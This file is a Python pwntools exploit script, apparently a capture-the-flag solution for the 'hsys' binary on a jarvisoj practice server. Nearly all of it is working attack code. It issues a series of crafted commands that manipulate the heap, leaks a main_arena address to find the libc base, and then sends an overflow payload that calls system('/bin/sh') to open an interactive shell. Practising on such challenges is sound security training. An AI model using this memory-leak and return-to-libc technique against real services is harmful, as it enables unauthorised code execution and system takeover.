#!/usr/bin/env python
# -*- coding: utf-8 -*-

#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
    cn = process('./hsys')
    bin = ELF('./hsys')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    cn = remote('pwn2.jarvisoj.com', 9896)
    bin = ELF('./hsys')
    libc = ELF('./libc-2.19.so')


def z(a=''):
    gdb.attach(cn,a)
    if a == '':
        raw_input()


for i in range(1337):

    cn.sendline('add '+str(i))

context.log_level = 'debug'
cn.sendline('add test')
cn.recv()
cn.sendline('add test2')
cn.recv()
cn.sendline('add test')
cn.recv()
cn.sendline('info '+'W'*0x80)
cn.recv()
cn.sendline('add test3')
cn.recv()
cn.sendline('add admin')
cn.recv()
cn.sendline('del test')
cn.recv()
cn.sendline('add b')#test chunk
cn.recv()
cn.sendline('show')
cn.recv()
cn.sendline('info '+'Q'*0xf0)#0xf76d57b0 (main_arena+48)
cn.recv()
cn.sendline('add c')
cn.recv()
cn.sendline('show')
cn.recvuntil('Name: c')
if local:
    main_arena=0x1b2780
    libc.address = u32('\xb0'+cn.recv(3))-48-main_arena
else:
    main_arena=0x1AB420
    libc.address = u32('\x50'+cn.recv(3))-48-main_arena
success('libc_base: '+hex(libc.address))

adminname = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabx'

cn.sendline('add aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabx')
cn.recv()

system = libc.symbols['system']
binsh = libc.search('/bin/sh\x00').next()
pay = "A"*0x3A + p32(system)+'bbbb'+p32(binsh)
cn.sendline('info '+pay)#0xf76d57b0 (main_arena+48)
cn.recv()
cn.sendline('show')
cn.sendline('exit')
#z('b*0x08049FAB\nc')


cn.interactive()
